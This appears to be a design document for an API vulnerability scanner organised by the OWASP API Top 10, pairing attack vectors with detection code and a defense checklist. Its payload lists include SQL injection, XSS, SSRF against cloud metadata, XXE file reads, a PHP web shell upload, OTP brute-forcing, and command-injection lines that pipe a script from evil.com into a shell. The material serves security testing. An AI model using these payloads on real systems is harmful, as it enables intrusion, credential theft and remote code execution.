# API Security Scanner - Comprehensive Vulnerability Detection Framework

**Version**: 1.0  
**Purpose**: Build the strongest API Security scanner by detecting all known vulnerabilities and attack patterns  
**Based on**: Analysis of 1000+ API security articles, bug bounty writeups, and OWASP API Top 10

---

## Table of Contents
1. [API Vulnerability Categories](#api-vulnerability-categories)
2. [Detection Patterns & Payloads](#detection-patterns--payloads)
3. [Attack Strategies](#attack-strategies)
4. [Defense Mechanisms](#defense-mechanisms)
5. [Scanner Implementation Guide](#scanner-implementation-guide)

---

## API Vulnerability Categories

### 1. BROKEN OBJECT LEVEL AUTHORIZATION (BOLA / IDOR)
**Severity**: Critical (OWASP API #1 2023)

#### Attack Vectors
- **Numeric ID Enumeration**: Replace `/api/v1/users/123` → `/api/v1/users/124`
- **UUID Enumeration**: Sequential UUIDs or timing-based enumeration
- **Horizontal Escalation**: Access peer records (user A accessing user B's data)
- **Vertical Escalation**: Admin access without proper authorization
- **Resource Path Manipulation**: `/api/v1/users/{userId}/orders` → `/api/v1/admins/{userId}/orders`

#### Detection Patterns
```python
# Look for
- Numeric IDs in URLs/params: \d+, sequential values
- UUIDs: [0-9a-f]{8}-[0-9a-f]{4}-...
- User-controllable path segments: /api/{resource}/{id}
- Missing authentication checks before resource access
- No token/session validation on resource endpoints
```

#### Scanner Implementation
```python
# 1. Enumerate IDs
for id in range(1, 1000):
    resp = request(f"GET /api/v1/users/{id}")
    if resp.status == 200:
        check_if_accessible_without_auth()
        compare_data_with_current_user()

# 2. Cross-user testing
user_a_token = login('user_a')
user_b_id = 456
resp = request(f"GET /api/v1/users/{user_b_id}", headers={'Authorization': user_a_token})
if "user_b_data" in resp.body:
    VULNERABLE_BOLA()
```

---

### 2. BROKEN AUTHENTICATION
**Severity**: Critical (OWASP API #2 2023)

#### Attack Vectors
- **No Authentication**: API endpoints with no auth requirement
- **Weak Token Generation**: Predictable JWT, session IDs, API keys
- **Token Storage Issues**: Keys in source code, hardcoded in APKs, JS
- **No Token Validation**: Expired tokens still accepted
- **Brute Force**: Weak password policies, no rate limiting
- **OTP Bypass**: Predictable one-time passwords
- **Session Fixation**: Attacker-controlled session IDs
- **JWT Weaknesses**: No signature verification, weak secrets, algorithm confusion
- **OAuth Bypass**: Improper redirect handling, CSRF in auth flow

#### Detection Patterns
```python
# Endpoints without auth
- No Authorization header check
- Public endpoints with sensitive data
- Skip auth with specific parameters: /api/v1/admin?bypass=true

# Token issues
- Weak JWT secrets: "secret", "123456", "password"
- Algorithm: HS256 with known secret (verify with kid:key)
- Expired tokens accepted
- No issuer/audience validation

# Brute force indicators
- No rate limiting
- No account lockout after N failures
- Weak password requirements
```

#### Detection Payloads
```bash
# Test no auth
curl -s https://target/api/v1/admin -H "Authorization: Bearer invalid"

# Brute OTP
for otp in {0000..9999}; do
  curl -s -X POST https://target/api/auth/verify \
    -d "user_id=123&otp=$otp"
done

# JWT secret brute
jwt.decode(token, secret="secret", algorithms=["HS256"])
jwt.decode(token, secret="password", algorithms=["HS256"])

# Weak JWT generation (predictable kid)
# If JWT header: {"alg":"HS256","kid":"key1"}
# Try: alg confusion attack (change HS256 to RS256, use public key as secret)
```

---

### 3. EXCESSIVE DATA EXPOSURE
**Severity**: High (OWASP API #3 2023)

#### Attack Vectors
- **Over-privileged API responses**: Return sensitive fields not needed by client
- **Data in error messages**: Stack traces, internal paths, API versions
- **Debug endpoints exposed**: `/debug`, `/actuator`, `/health` with sensitive info
- **Historical data retention**: Old API versions still return full records
- **API documentation exposure**: `/swagger.json`, `/openapi.yaml` with examples
- **Metadata leakage**: Timestamps, internal IDs, system info in responses

#### Detection Patterns
```python
# Check response payloads
- Unnecessary fields: passwords, internal_id, ssn, credit_card
- Full user profiles returned for list endpoints
- Logs/debugging info in responses
- Error details revealing system architecture
```

#### Scanner Implementation
```python
def detect_excessive_data():
    # Compare responses by role
    resp_admin = request_as(token_admin, "/api/v1/users/123")
    resp_user = request_as(token_user, "/api/v1/users/123")
    
    extra_fields = set(resp_admin.json.keys()) - set(resp_user.json.keys())
    if extra_fields:
        VULNERABLE_EXCESSIVE_DATA_EXPOSURE(extra_fields)
    
    # Check for sensitive fields in any response
    SENSITIVE_FIELDS = {
        'password', 'secret', 'token', 'api_key', 'credit_card',
        'ssn', 'internal_id', 'private_key', 'auth_token'
    }
    
    for field in SENSITIVE_FIELDS:
        if field in str(resp_admin.body):
            VULNERABLE_EXCESSIVE_DATA_EXPOSURE(field)
```

---

### 4. LACK OF RESOURCE & RATE LIMITING
**Severity**: High (OWASP API #4 2023)

#### Attack Vectors
- **No Rate Limiting**: Send unlimited requests, DoS the API
- **No Request Size Limits**: Large payloads cause OutOfMemory
- **No Pagination**: Dump entire database with single request
- **No Timeout**: Long-running operations block resources
- **No Concurrency Limits**: Exhaust connection pools
- **Budget Exhaustion**: Cost-based attacks on cloud APIs

#### Detection Patterns
```python
# Rate limit test
success_count = 0
for i in range(1000):
    resp = request(f"/api/v1/auth/login", method="POST", data=payload)
    if resp.status == 200 or resp.status == 401:
        success_count += 1
    elif resp.status == 429:
        VULNERABLE_RATE_LIMITING()
        break

if success_count > 100:
    NO_RATE_LIMITING()

# Pagination check
resp = request("/api/v1/products")
if len(resp.json) > 10000:
    NO_PAGINATION()
```

#### Scanner Implementation
```python
def test_rate_limiting():
    endpoints = [
        "/api/v1/auth/login",
        "/api/v1/auth/register",
        "/api/v1/auth/forgot-password",
        "/api/v1/otp/generate",
    ]
    
    for endpoint in endpoints:
        burst_count = 0
        for i in range(100):
            resp = request("POST", endpoint, payload)
            if resp.status in (200, 401):
                burst_count += 1
            elif resp.status == 429:
                break
        
        if burst_count > 50:
            report_MISSING_RATE_LIMIT(endpoint, burst_count)
```

---

### 5. BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA)
**Severity**: High (OWASP API #5 2023)

#### Attack Vectors
- **Method Tampering**: GET /api/users (allowed) → PUT /api/users/123 (unauthorized)
- **Privilege Escalation**: Regular user can DELETE /api/admin
- **Hidden Admin Endpoints**: /api/v1/admin/users accessible to users
- **Bypassing Authorization Checks**: POST bypasses auth where GET requires it
- **Endpoint Enumeration**: Find admin endpoints not listed in docs

#### Detection Patterns
```python
# Method tampering
methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
for method in methods:
    resp = request(method, "/api/v1/users/123")
    if method != "GET" and resp.status < 400:
        POTENTIALLY_VULNERABLE(method)

# Admin endpoint discovery
admin_paths = [
    "/api/v1/admin/",
    "/api/v1/users/delete",
    "/api/v1/config/update",
    "/api/v1/impersonate",
]
```

---

### 6. MASS ASSIGNMENT VULNERABILITY
**Severity**: High (OWASP API #6 2023)

#### Attack Vectors
- **Over-assignment**: POST `/api/v1/users` with `"role":"admin"` in request body
- **Direct Field Manipulation**: Update read-only fields like `created_at`, `user_id`
- **Price Manipulation**: Change `"price": 99.99` → `"price": 0.01` in cart
- **Status Bypass**: Change order status directly without workflow

#### Detection Patterns
```python
# Detect mass assignment
sensitive_fields = {
    'role', 'admin', 'is_admin', 'is_verified', 'is_premium',
    'price', 'discount', 'balance', 'credit',
    'owner_id', 'creator_id', 'status',
}

request_body = {
    "username": "attacker",
    "email": "attacker@evil.com",
    "role": "admin",  # ← mass assignment attempt
    "is_verified": True,
}

resp = request("POST", "/api/v1/users", json=request_body)
if resp.status == 201:
    CHECK_IF_ROLE_ADMIN_WAS_SET()
```

---

### 7. INSECURE DIRECT OBJECT REFERENCES (IDOR)
**Severity**: Critical (Core subcategory of BOLA)

#### Attack Vectors
- **Direct ID Manipulation**: Change `/api/orders/1001` → `/api/orders/1002`
- **Predictable IDs**: Sequential UUIDs, timestamps as IDs
- **Hash Crack**: MD5, SHA1 used for object IDs (reversible)
- **JWT ID Extraction**: User ID embedded in JWT, modify and re-sign
- **Cookie Manipulation**: Session ID, user ID in cookies

#### Scanner Implementation
```python
def test_idor():
    # Get current user's resource ID
    my_resource_id = get_my_resource_id()
    
    # Try accessing other resources
    for other_id in range(my_resource_id - 100, my_resource_id + 100):
        if other_id == my_resource_id:
            continue
        
        resp = request(f"GET /api/v1/users/{other_id}")
        if resp.status == 200 and OTHER_USER_DATA_EXPOSED:
            VULNERABLE_IDOR(other_id)
```

---

### 8. SECURITY MISCONFIGURATION
**Severity**: High (OWASP API #8 2023)

#### Attack Vectors
- **Unnecessary HTTP Methods Enabled**: DELETE allowed on all endpoints
- **Debug Mode Enabled**: Stack traces, detailed errors in responses
- **CORS Misconfiguration**: `Access-Control-Allow-Origin: *`
- **SSL/TLS Issues**: Outdated TLS, self-signed certs
- **HTTP Methods Allowed**: OPTIONS reveals all methods
- **Directory Listing**: /api/v1/, /swagger/, /docs/ exposed
- **Default Credentials**: API key=admin/admin still active
- **Verbose Headers**: Server version, X-Powered-By, etc. exposed

#### Detection Patterns
```python
# CORS bypass
headers = {'Origin': 'https://evil.com'}
resp = request("GET", endpoint, headers=headers)
if 'Access-Control-Allow-Origin: *' in resp.headers:
    VULNERABLE_CORS()

# Debug mode
if 'Traceback' in resp.body or 'Exception' in resp.body:
    VERBOSE_ERROR_MESSAGES()

# OPTIONS method
resp = request("OPTIONS", endpoint)
if 'Allow' in resp.headers:
    print(f"Allowed methods: {resp.headers['Allow']}")
```

---

### 9. API INJECTION
**Severity**: Critical (OWASP API #7/8 2023)

#### Attack Vectors
- **SQL Injection**: `/api/v1/users?name=admin' OR '1'='1`
- **Command Injection**: `/api/v1/file?path=$(cat /etc/passwd)`
- **XML/XXE Injection**: POST with malicious XML entity definitions
- **JSON Injection**: Improper parsing of JSON with special chars
- **Template Injection**: `/api/v1/template?name={{7*7}}`
- **GraphQL Injection**: Query depth exhaustion, fragment cycles
- **Path Traversal**: `/api/v1/file?path=../../etc/passwd`

#### Detection Payloads
```python
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT NULL, NULL, NULL --",
    "1' OR '1'='1' /*",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "& ping -c 1 127.0.0.1 &",
]

XXE_INJECTION_PAYLOAD = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
]
```

---

### 10. API-SPECIFIC ATTACKS

#### GraphQL Attacks
- **Query Depth Exhaustion**: Send deeply nested queries to DoS
- **Fragment Cycles**: Circular fragment references
- **Alias Exhaustion**: Use aliases to multiplex requests
- **Introspection Abuse**: Dump entire schema including internal types

```python
# GraphQL introspection
query = """
{
  __schema {
    types {
      name
      fields { name }
    }
  }
}
"""
```

#### REST API Specifics
- **HTTP Method Override**: `X-HTTP-Method-Override: DELETE` on POST
- **Header Injection**: Newline injection in custom headers
- **Parameter Pollution**: Duplicate params with different values
- **Content-Type Bypass**: JSON instead of form-data to bypass filters

---

### 11. CRYPTOGRAPHIC FAILURES

#### Attack Vectors
- **Weak Encryption**: DES, RC4, MD5 used for sensitive data
- **No Encryption in Transit**: HTTP instead of HTTPS
- **Hardcoded Keys**: Encryption keys in source code
- **Predictable Random**: Weak PRNG for tokens/salts
- **Insufficient Key Length**: 56-bit keys, short IV

#### Detection
```python
# Check encryption algorithms
if "md5" in source_code or "sha1" in source_code:
    WEAK_HASHING()

# Certificate validation
if ssl_cert.expires_in < 30:
    CERTIFICATE_EXPIRING()
```

---

### 12. ACCOUNT TAKEOVER & PRIVILEGE ESCALATION

#### Attack Vectors
- **Token Hijacking**: Steal JWT/session via XSS, MitM, or API leak
- **Credential Stuffing**: Use leaked passwords across services
- **Account Recovery Bypass**: Reset password without verification
- **Email Change Bypass**: Change email without current password
- **Phone Number Takeover**: Attacker-controlled phone receives OTP
- **Permission Inference**: Low-privUser → Admin via token manipulation

#### Detection
```python
# Token lifetime check
if jwt_token_expiry > 30_days:
    EXCESSIVE_TOKEN_LIFETIME()

# Account recovery testing
# Test reset password without verification
reset_token = get_password_reset_token(target_email)
# Can we use it without email confirmation?

# Permission enumeration
roles = extract_roles_from_token()
```

---

### 13. SENSITIVE INFORMATION DISCLOSURE

#### Attack Vectors
- **API Key Leakage**: Keys in JavaScript, GitHub, error messages
- **PII Exposure**: Emails, phone numbers in list endpoints
- **Internal IP Disclosure**: IP addresses in responses/headers
- **AWS Metadata**: Access to 169.254.169.254 metadata service
- **Configuration Exposure**: `/api/config`, `/.env`, `/docker-compose.yml`
- **Historical Data**: Old API versions or backups with sensitive data

#### Real-World Examples
```
- Google Maps API key in JS → $5000+ charges by attacker
- Picasa API: Billions of Google Photos exposed
- USPS API: 60M users' information exposed
- Capital One: SSRF → AWS IAM credentials → $100M data breach
- Braintree API: Unlimited file storage in transaction fields
```

---

### 14. BUSINESS LOGIC FLAWS

#### Attack Vectors
- **Price Manipulation**: Order items at $0, apply discount twice
- **Race Conditions**: Check-then-act vulnerabilities in inventory
- **Workflow Bypass**: Skip approval steps in order processing
- **Balance Bypass**: Transfer negative balance, bypass wallet limits
- **Coupon Abuse**: Use single-use coupon multiple times
- **Referral Loops**: Refer yourself for bonus points

#### Detection
```python
# Price check
original_price = 99.99
modified_price = 0.01
# Complete purchase at modified price

# Race condition (two concurrent requests)
req1 = transfer(from_user=A, to_user=B, amount=1000)
req2 = transfer(from_user=A, to_user=C, amount=1000)
# Both succeed with only 1000 balance?

# Coupon abuse
apply_coupon("SAVE50")  # -50%
apply_coupon("SAVE50")  # -50% again on reduced price?
```

---

### 15. BROKEN FILE UPLOAD

#### Attack Vectors
- **Executable Upload**: Upload .php, .exe, .jsp → RCE
- **Path Traversal**: Upload with filename `../../etc/passwd`
- **Zip Bomb**: Upload malicious archive → DoS via decompression
- **SVG/XML Upload**: XML entity injection in uploaded files
- **Content-Type Bypass**: Upload .exe as `Content-Type: image/jpeg`
- **Double Extension**: `shell.php.jpg` → executed as PHP

#### Detection
```python
# Test file upload
files = {
    'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')
}
resp = request("POST", "/api/v1/upload", files=files)
if resp.status == 200:
    # Try to access the file
    shell_resp = request("GET", f"/uploads/{filename}?cmd=id")
```

---

## Detection Patterns & Payloads

### Universal Scanning Payloads

```python
# SQLi detection
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "admin'--",
    "1' UNION SELECT NULL--",
]

# XSS detection (in API responses)
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "';alert('xss');//",
]

# SSRF detection
SSRF_PAYLOADS = [
    "http://127.0.0.1:8080",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost/admin",
    "gopher://127.0.0.1:25/",
]

# Command injection
CMD_PAYLOADS = [
    "; whoami",
    "| id",
    "$(curl http://evil.com/shell.sh | sh)",
    "`cat /etc/passwd`",
]
```

---

## Attack Strategies

### 1. Reconnaissance & Mapping
```bash
# Extract API endpoints
gospider -s https://target.com -o output
gau target.com | grep -E '(api|v1|v2)' 
katana -u https://target.com -jc -xhr

# API documentation discovery
curl -s https://target.com/swagger.json
curl -s https://target.com/openapi.yaml
curl -s https://target.com/api/docs

# Subdomain enumeration
subfinder -d target.com -o subs.txt
```

### 2. Authentication Bypass
```bash
# Null authentication
curl -H "Authorization: " https://target.com/api/v1/admin

# Default credentials
curl -u admin:admin https://target.com/api/v1/auth/test

# Token manipulation
# Decode JWT: jwt_decode(token)
# Try common secrets: admin, secret, 123456
# Algorithm confusion: change HS256→RS256, use public key as secret
```

### 3. Data Enumeration
```bash
# Numeric ID enumeration
for i in {1..1000}; do
  curl -s https://target.com/api/v1/users/$i | jq '.name'
done

# Dictionary attack on resources
cat wordlist.txt | while read word; do
  curl -s https://target.com/api/v1/$word | head -20
done
```

### 4. Privilege Escalation
```python
# Extract current user info
me = request("GET", "/api/v1/me")
print(f"Role: {me.json['role']}")

# Try accessing admin endpoints
admin = request("GET", "/api/v1/admin/users")
if admin.status == 200:
    PRIVILEGE_ESCALATION()

# Modify JWT claims
# Change "role": "user" → "role": "admin"
# Re-sign with known secret
```

---

## Defense Mechanisms

### Secure Implementation Checklist

#### Authentication
- [ ] Implement proper token validation on ALL endpoints
- [ ] Use strong secret keys (256+ bit entropy)
- [ ] Implement rate limiting on auth endpoints
- [ ] Use HTTPS only, no HTTP fallback
- [ ] Implement account lockout after N failures
- [ ] Never hardcode credentials
- [ ] Rotate API keys regularly
- [ ] Use OAuth 2.0 / OpenID Connect where appropriate

#### Authorization
- [ ] Validate user permissions on EVERY resource access
- [ ] Implement principle of least privilege
- [ ] Use ABAC (Attribute-Based Access Control) not just RBAC
- [ ] Audit authorization decisions
- [ ] Implement resource ownership checks
- [ ] Validate both horizontal (peer) and vertical (admin) access

#### Data Protection
- [ ] Minimize data in API responses (field projection)
- [ ] Classify data sensitivity levels
- [ ] Encrypt sensitive data at rest and in transit
- [ ] Don't log sensitive data (passwords, tokens, PII)
- [ ] Implement data retention policies
- [ ] Use TLS 1.2+ with strong ciphers

#### Input Validation
- [ ] Whitelist allowed input formats
- [ ] Validate content-type headers
- [ ] Limit request size (50MB max)
- [ ] Sanitize all user inputs
- [ ] Use parameterized queries (prevent SQL injection)
- [ ] Escape special characters in responses
- [ ] Validate file uploads (type, size, content)

#### Rate Limiting & Resource Management
- [ ] Implement rate limiting per user/IP
- [ ] Implement timeout on all requests (30s default)
- [ ] Limit request size and payload depth
- [ ] Implement pagination with max limits
- [ ] Set connection pool limits
- [ ] Monitor and alert on unusual patterns

#### API Security Configuration
- [ ] Disable unnecessary HTTP methods (allow GET, POST, PUT, DELETE only)
- [ ] Remove debug information from production
- [ ] Set proper CORS headers (restrict origins)
- [ ] Disable directory listing
- [ ] Use security headers (HSTS, CSP, X-Content-Type-Options)
- [ ] Version APIs appropriately
- [ ] Implement request signing for critical operations

#### Monitoring & Logging
- [ ] Log all authentication attempts
- [ ] Log authorization failures
- [ ] Log sensitive operations (delete, admin actions)
- [ ] Implement anomaly detection
- [ ] Set up alerts for suspicious patterns
- [ ] Regular security audits
- [ ] Penetration testing schedule

---

## Scanner Implementation Guide

### Phase 1: Reconnaissance
```python
def phase_1_reconnaissance(target):
    # 1. Extract all endpoints from Swagger/OpenAPI
    swagger_endpoints = extract_swagger_spec(target)
    
    # 2. Crawl website for hidden endpoints
    crawled_endpoints = crawl_site(target)
    
    # 3. Query historical records
    wayback_urls = query_wayback(target)
    gau_urls = query_gau(target)
    
    # 4. Combine all endpoints
    all_endpoints = merge(swagger_endpoints, crawled_endpoints, 
                         wayback_urls, gau_urls)
    
    return all_endpoints
```

### Phase 2: Authentication Testing
```python
def phase_2_auth_testing(endpoints):
    findings = []
    
    for endpoint in endpoints:
        # Test 1: No authentication required
        resp = request(endpoint)
        if resp.status < 400:
            findings.append(NO_AUTH_REQUIRED(endpoint))
        
        # Test 2: Weak token validation
        invalid_token = "invalid_token_12345"
        resp = request(endpoint, token=invalid_token)
        if resp.status < 400:
            findings.append(WEAK_TOKEN_VALIDATION(endpoint))
        
        # Test 3: Token lifetime
        token_exp = extract_token_expiry()
        if token_exp > 30 * 24 * 3600:  # 30 days
            findings.append(EXCESSIVE_TOKEN_LIFETIME(endpoint))
    
    return findings
```

### Phase 3: Authorization Testing
```python
def phase_3_auth_testing(endpoints):
    findings = []
    
    # Get two users with different roles
    user1_token = login('user1')  # Regular user
    admin_token = login('admin')   # Admin user
    
    for endpoint in endpoints:
        # Test 1: User can access admin endpoints
        resp = request(endpoint, token=user1_token)
        if resp.status < 400:
            findings.append(BROKEN_FUNCTION_AUTH(endpoint))
        
        # Test 2: User can access other user's resources
        user_id = 999
        resource_url = f"/api/v1/users/{user_id}"
        resp = request(resource_url, token=user1_token)
        if resp.status == 200 and OTHER_USER_DATA_EXPOSED:
            findings.append(IDOR(resource_url, user_id))
    
    return findings
```

### Phase 4: Injection Testing
```python
def phase_4_injection_testing(endpoints):
    payloads = {
        'sqli': ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"],
        'cmd': ["; whoami", "| id", "$(curl http://evil.com/shell)"],
        'xxe': [XXE_PAYLOAD],
        'path': ["../../../etc/passwd", "....//....//etc/passwd"],
    }
    
    findings = []
    
    for endpoint in endpoints:
        for payload_type, payload_list in payloads.items():
            for payload in payload_list:
                resp = request(endpoint, payload=payload)
                if is_injection_successful(payload, resp):
                    findings.append(INJECTION_FOUND(endpoint, payload_type))
    
    return findings
```

### Phase 5: Business Logic Testing
```python
def phase_5_business_logic(endpoints):
    findings = []
    
    # Test price manipulation
    price = 99.99
    resp = request(POST /api/v1/cart/add, {'item': 1, 'price': 0.01})
    if resp.status == 201:
        findings.append(MASS_ASSIGNMENT_PRICE_MANIPULATION())
    
    # Test race conditions
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for i in range(10):
            futures.append(executor.submit(request_transfer, amount=1000))
        
        # If all succeed with only 1000 balance → race condition
    
    return findings
```

---

## Implementation Priorities

### High Priority (Implement First)
1. ✅ BOLA / IDOR detection
2. ✅ Broken authentication detection
3. ✅ Injection detection (SQL, CMD, XXE)
4. ✅ Excessive data exposure
5. ✅ Rate limiting testing

### Medium Priority
6. CSRF detection
7. SSRF detection
8. Business logic flaws
9. File upload vulnerabilities
10. API key leakage

### Low Priority
11. Cryptographic weakness analysis
12. SSL/TLS configuration
13. Debug mode detection
14. Verbose error messages

---

## Expected Vulnerabilities by Attack Surface

| Endpoint Type | Common Vulnerability |
|---|---|
| `/api/v1/auth/*` | Broken authentication, rate limiting bypass |
| `/api/v1/users/*` | BOLA/IDOR, excessive data exposure |
| `/api/v1/admin/*` | BFLA, unauthorized access |
| `/api/v1/orders/*` | Business logic flaws, mass assignment |
| `/api/v1/payments/*` | Price manipulation, race conditions |
| `/api/v1/files/*` | Path traversal, file upload bypass |
| `/api/v1/search/*` | Injection attacks, ReDoS |
| `/api/v1/graphql` | Query depth exhaustion, introspection |
| `/api/v1/webhooks/*` | SSRF, unauthorized webhook creation |
| `/api/v1/config*` | Information disclosure, misconfiguration |

---

## References & Sources

- OWASP API Top 10 2023
- 1000+ Medium articles on API security
- Bug bounty writeups from HackOne, Bugcrowd, Intigriti
- Real-world breaches: Capital One, USPS, Picasa, Braintree
- API hacking writeups: CRAPI, OWASP WebGoat
- Tools: Burp Suite, OWASP ZAP, Postman, Insomnia

---

## Next Steps

1. **Integrate into APIHarvester**:
   - Add phase-by-phase attack modules
   - Implement payload templates
   - Add detection logic for each vulnerability

2. **Enhance Endpoint Discovery**:
   - Extract from Swagger specs
   - Learn custom API prefixes
   - Generate composite path wordlists

3. **Automated Testing**:
   - Parallel endpoint testing
   - Concurrent exploitation (race conditions)
   - Result correlation and deduplication

4. **Reporting**:
   - CVSS scoring for each finding
   - Proof-of-concept generation
   - Remediation recommendations

---

**Author**: APIHarvester Security Framework  
**Last Updated**: 2026-07-16  
**Version**: 1.0.0
